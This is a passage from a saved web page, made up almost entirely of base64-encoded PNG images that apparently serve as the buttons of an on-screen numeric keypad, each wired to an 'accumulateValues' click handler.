ADqYAAAOpgAABdvkl/FRgAABLZJREFUeNqEyzEKgEAQBMEW7gP6/2T/tqmR8TTmh4sDExVNVQGcH18HcKk327r7WQBJdiMJI6r8l+pcTvgCAAD//2yPUQoAIAhDn9H9D+EV/Xb1U0LkYCCM4Zsd7E8maXXB7CAARmZy7e51Pw1JNcMiov/R4QJsAAAA///CGbi4wKNHjz7jDAB8gAmmCRtetGgRhtj///9xRxIDAwODhYUFhhzeaP/+/Ts8DImOcXZ2dgZ5eXkMOVhK+PT58+fLxAbC9u3bywEAAAD//6RSsQ0EIQxzTldAcQswya3AjF/CCDAPEi0NDbWveJ30RYqgj5TGiuXYiQC4gK+ipWStRe+9PWoR2brN+WZuJpAESftKL+G3U0rQcJKQOSedc/8pkEQpRcUP7RFzzogxqk+qKrTWUGvVPYwxtjxsx7pP6L1/Qgi3ZZgkHgAAAP//zFUhDsMwDLwMlHUgqIV9St8RWBqW74QG9Q/FIesXGhIVVKsyTSrN0KZtYLOngZ5kZss639kWAI7e+0tZlvg3cs4IIZwEALlt25kzLA4er4I7Ly6b/TWx1qJpGozjCK01KIck5/z5Xr9HURRo2xbGGPR9T6q5u0umlMjCT9OEYRjQdR0pP8Z4FQDkuq5sdznnoJQiNTk8a/ItnHMv+lHrBAC5LAuZyTzPqOuazDjGyN+TqqpYdt/nnvyKGwAAAP//3FehjoNAEH0QEnAnDzlJBQKHQvMb/MQJDK6eXJAYDJ5fgF8hOcFKuIawqG7FtUkvObHTdMmlo3dnMvNm5r2xrtrmzZD/s1Lq22ma5jOKog/btp8eQUoJy7LenSAIKAxDM2n8qAuHrU1YWFx929jBHNPti5tINB1kn3L9q0yklCiKAl3Xoa5r3iWju67btkWWZUiSBK7raq95Vnf9xSPa3aX7IU3TX+9YQTi1FUJgmiZs22YGE6UUfN8HEWEcRzOY3MzzPBARq1zaQuL+6uCICNaczPP88FBqYxLHMfq+x7quGIbBDCZEBCKCEAJ5nvMx4RhHc+3KJ6/DjC/E8VVVHcuyPJiQRsuyfAE4Xdg1YxXFoSgMfzIDEzESs53FFOlGUEgstTJlbKZOu9r6IqIvIAuyoG9hJVoq8wTXQhB2i1u4cDUw6zSrK1jMDHgzRvwf4JLD/5/D/5+TFHBXKBScVqv1PZPJPOr0YedGFEXr8Xj8s9/vv6SAb6PR6EexWHw2TZMkIYoilsvlulQqPd0DmKZJNptF1+JDFwzDwLKs+DoxVouqOzPqmiaxzsbYGIkjxd8Y+WpGlFLMZjNWq9XBQpXLZT5z+PgMI1qafTKZMJ1OaTQaVCoVAKSUtNttfN+nWq2e1Tpok5YQgnw+j23/P2bato3jOAghkjN+gyBgs9mcvHecmhIhrVwud/LBSimEEPi+n5xC9hgMBgcppdNpwjDEcRx9hejC8YlAKUWn08HzPOr1enItyn51IaXUy8g5CxkOhwCEYfju2LzoHrEsi8VicfKelPLDC6WL6JEgCJjP53S73cNOzzAMarUanucly8a7rovrutpkdd2m8RqC1S0hXhquqkdet9vt7yRK699PiL+Av6ler0ez2bwHMsBDwoh4Bf7sdrvt2wAeP0dJsSWqRwAAAABJRU5ErkJggg=="><img data-savepage-currentsrc="2.png" onclick="accumulateValues('2')" data-savepage-src="/tra_cosmos_img/Images-pave-digital/2.png" src="data:image/png;base64,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"><img data-savepage-currentsrc="vide.png" data-savepage-src="/tra_cosmos_img/Images-pave-digital/vide.png" src="data:image/png;base64,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"><img data-savepage-currentsrc="7.png" onclick="accumulateValues('7')" data-savepage-src="/tra_cosmos_img/Images-pave-digital/7.png" src="data:image/png;base64,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